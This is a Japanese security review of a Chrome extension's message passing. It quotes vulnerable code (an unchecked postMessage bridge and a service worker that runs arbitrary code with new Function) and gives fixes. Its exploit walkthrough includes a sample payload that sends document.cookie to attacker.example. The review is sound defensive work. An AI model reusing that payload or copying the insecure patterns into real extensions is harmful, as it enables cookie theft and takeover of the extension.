# セキュリティレビュー: Content Script ↔ Service Worker メッセージパッシング

## 対象

- **実行コンテキスト**: Content Script (`content.ts`) / Service Worker (`background.ts`)
- **manifest バージョン**: MV3（想定）
- **主な権限**: `scripting`（`executeScript` 使用から推定）、`storage`
- **外部通信先**: 不明（コードスニペットのみ提供、manifest.json 未確認）

---

## Step 1: 実行面の特定

| コンテキスト | 役割 |
|---|---|
| Content Script (`content.ts`) | ウェブページの `window` オブジェクトにアクセスし、ページからの `postMessage` を受信して SW へ中継 |
| Service Worker (`background.ts`) | Content Script からのメッセージを受信し、`DOM_INJECT` 型メッセージで動的コードを対象タブへ注入 |

信頼境界:
- **ウェブページ**（最低信頼）→ postMessage → **Content Script**（中間）→ sendMessage → **Service Worker**（最高権限）

---

## Step 2: 権限境界と攻撃面

manifest.json が未提供のため以下は推定を含む。

- `chrome.scripting.executeScript` 呼び出しには `scripting` 権限と対象 URL への `host_permissions` が必要
- `sender.tab.id` を参照しており、`tabs` または `activeTab` 権限が必要
- `new Function()` は MV3 デフォルト CSP で禁止されているため、`content_security_policy` を緩和している可能性

---

## 重大指摘

### [CRITICAL-1] ウェブページからの任意メッセージが Service Worker へ無検証転送される

**事実:**
```typescript
// content.ts
window.addEventListener('message', (event) => {
  chrome.runtime.sendMessage(event.data);  // event.origin 未検証
});
```
`event.origin` および `event.source` の検証が一切ない。任意のオリジン（同一ページ内の悪意ある iframe、XSS されたページなど）から送信されたメッセージがそのまま Service Worker へ転送される。

**影響:**
悪意あるウェブページが `window.postMessage({ type: 'DOM_INJECT', code: '悪意あるコード' })` を送信するだけで、Service Worker に任意コードの実行を指示できる。Content Script が橋渡し（bridge）として機能しており、ウェブページ → 拡張機能のエスカレーションが成立する。

**悪用経路:**
1. 攻撃者が対象サイトに XSS を仕込む（または Content Script の `matches` 対象のページ上で `postMessage` を呼ぶ）
2. `{ type: 'DOM_INJECT', code: 'fetch("https://attacker.example/steal?cookie="+document.cookie)' }` を送信
3. Content Script が無検証のまま SW へ転送
4. SW が `new Function(msg.code)` で攻撃者コードを実行

**推奨対策:**
```typescript
// content.ts
const ALLOWED_ORIGIN = 'https://your-trusted-origin.example.com';

window.addEventListener('message', (event) => {
  // origin と source を両方検証
  if (event.origin !== ALLOWED_ORIGIN || event.source !== window) return;
  // さらに msg の型・構造を検証してから転送
  if (typeof event.data?.type !== 'string') return;
  chrome.runtime.sendMessage(event.data);
});
```
ただし、そもそもウェブページからのメッセージを SW へ橋渡しするアーキテクチャ自体を見直すことを強く推奨する。

---

### [CRITICAL-2] Service Worker が任意コードを動的生成・実行している

**事実:**
```typescript
// background.ts
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.type === 'DOM_INJECT') {
    chrome.scripting.executeScript({
      target: { tabId: sender.tab.id },
      func: new Function(msg.code)  // msg.code は検証なし
    });
  }
});
```
`msg.code` に含まれる任意の文字列を `new Function()` でコンパイルし、ターゲットタブで実行している。

**影響:**
- 任意コード実行（Remote Code Execution に相当）
- MV3 のデフォルト CSP は `eval()` / `new Function()` を禁止しているため、これを動作させるには `content_security_policy` の `extension_pages` に `unsafe-eval` が必要 → 拡張機能全体のサンドボックスが破られている
- CRITICAL-1 と組み合わさると、ウェブページからの完全なコード実行エスカレーションが成立

**悪用経路:**
CRITICAL-1 の経路を踏んだ後、`msg.code` に任意スクリプトが渡される。

**推奨対策:**
- `new Function(msg.code)` パターンを廃止し、実行する処理を拡張機能側で定義した関数リストに限定する（allowlist 方式）
- 例:
```typescript
// background.ts
const ALLOWED_ACTIONS: Record<string, () => void> = {
  highlightPage: () => { document.body.style.outline = '3px solid red'; },
  // ...
};

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.type === 'DOM_INJECT') {
    const action = ALLOWED_ACTIONS[msg.action];
    if (!action) return;
    chrome.scripting.executeScript({
      target: { tabId: sender.tab.id },
      func: action
    });
  }
});
```

---

### [CRITICAL-3] Service Worker がメッセージ送信元（sender）を未検証で処理している

**事実:**
```typescript
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  // sender.id（拡張機能ID）の検証なし
  // sender.origin の検証なし
  if (msg.type === 'DOM_INJECT') { ... }
});
```
`sender.id` による自拡張機能からのメッセージかどうかの確認が行われていない。

**影響:**
`externally_connectable` が設定されている場合、外部ウェブページから直接 `chrome.runtime.sendMessage` でメッセージを送れる。また、別の拡張機能や悪意ある拡張機能からのメッセージも処理される。

**推奨対策:**
```typescript
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  // 自拡張機能のContent Scriptからのみ受け付ける
  if (sender.id !== chrome.runtime.id) return;
  if (msg.type === 'DOM_INJECT') { ... }
});
```

---

## 中程度指摘

### [MEDIUM-1] `sender.tab` の null チェック欠如

**事実:**
```typescript
target: { tabId: sender.tab.id }
```
`sender.tab` は Content Script 以外（Popup、Options Page、外部拡張機能）からのメッセージでは `undefined` になる。

**影響:**
未検証の送信元からのメッセージで `TypeError: Cannot read properties of undefined` が発生し、エラーログに内部情報が漏洩する可能性。

**推奨対策:**
```typescript
if (!sender.tab?.id) return;
```

### [MEDIUM-2] メッセージスキーマの未検証

**事実:**
`msg.type` の存在確認のみで、`msg.code` の型・長さ・内容の検証がない。

**影響:**
`msg.code` に巨大な文字列を渡すことによるメモリ枯渇、または制御文字混入による予期しない動作。

**推奨対策:**
Zod 等でメッセージスキーマを厳密に検証する。

---

## 前提不足

| 未確認設定 | 追加確認項目 |
|---|---|
| `manifest.json` 未提供 | `content_security_policy.extension_pages` に `unsafe-eval` が含まれているか確認必須 |
| `manifest.json` 未提供 | `externally_connectable` の設定有無と許可オリジン |
| `manifest.json` 未提供 | `host_permissions` のスコープ（`<all_urls>` の使用有無）|
| `manifest.json` 未提供 | `content_scripts.matches` の範囲（どのページで Content Script が動くか）|
| 実装意図不明 | ウェブページから動的コードを受け取る設計が本当に必要か（設計レベルの見直しを推奨）|

---

## 最低限の是正順

1. **今すぐ: `new Function(msg.code)` を廃止**
   動的コード実行を完全に排除し、allowlist 方式の関数呼び出しへ置き換える。これが最優先。

2. **今すぐ: `window.addEventListener('message')` で `event.origin` / `event.source` を検証**
   または、ウェブページからの bridge パターン自体を廃止する。

3. **今すぐ: `sender.id` を `chrome.runtime.id` と照合**
   Service Worker の `onMessage` ハンドラ先頭に送信元検証を追加。

4. **リリース前: manifest.json を確認し `unsafe-eval` を削除**
   `new Function()` を廃止した後、CSP を最小設定に戻す。

5. **リリース前: `sender.tab?.id` の null チェックを追加**
   防御的実装として必須。

6. **運用で補うこと: メッセージスキーマ検証（Zod等）の導入**
   型安全なメッセージ処理を実装し、不正メッセージをログ記録する。

---

## 総評

レビュー対象コードは **Chrome拡張機能のセキュリティにおける最も危険なアンチパターンを複数同時に実装している**。

- CRITICAL-1（origin 未検証の bridge）
- CRITICAL-2（任意コード動的実行）
- CRITICAL-3（sender 未検証）

これら3つが組み合わさることで、Content Script が注入されているページにアクセスするだけで、攻撃者が拡張機能の権限（全タブへのスクリプト実行）を乗っ取れる状態にある。現状のまま公開・運用することは不可。根本的な設計からの見直しが必要。
